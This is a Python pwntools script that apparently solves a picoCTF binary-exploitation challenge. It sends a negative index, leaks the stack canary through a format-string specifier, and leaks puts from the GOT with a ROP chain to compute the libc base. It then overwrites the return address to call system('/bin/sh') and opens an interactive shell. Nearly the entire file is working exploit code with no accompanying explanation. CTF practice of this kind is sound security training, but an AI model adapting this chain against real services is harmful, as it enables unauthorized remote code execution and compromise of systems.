from pwn import *

context.log_level = "debug"

r = remote("jupiter.challenges.picoctf.org", 18263)
exe = ELF("./vuln")
puts_offset = 0x67560
system_offset = 0x3CF10
str_bin_sh_offset = 0x17B9DB

r.recvuntil(b"?\n")
r.sendline(str(-3727))
r.recvuntil(b"? ")
r.sendline(b"%135$p")
r.recvuntil(b": ")
canary = int(r.recvline().decode().strip(), 16)
success("Canary: " + hex(canary))

r.recvuntil(b"?\n")
r.sendline(str(-3727))
r.recvuntil(b"? ")
payload = (
    cyclic(0x200)
    + p32(canary)
    + cyclic(12)
    + p32(exe.plt["puts"])
    + p32(exe.sym["win"])
    + p32(exe.got["puts"])
)
r.sendline(payload)
r.recvlines(2)
libc_puts = u32(r.recv(4))
success("puts: " + hex(libc_puts))
libc_base = libc_puts - puts_offset
success("libc_base: " + hex(libc_base))

r.recvuntil(b"? ")
libc_system = libc_base + system_offset
libc_str_bin_sh = libc_base + str_bin_sh_offset
payload = (
    cyclic(0x200)
    + p32(canary)
    + cyclic(12)
    + p32(libc_system)
    + p32(exe.sym["win"])
    + p32(libc_str_bin_sh)
)
r.sendline(payload)
r.interactive()
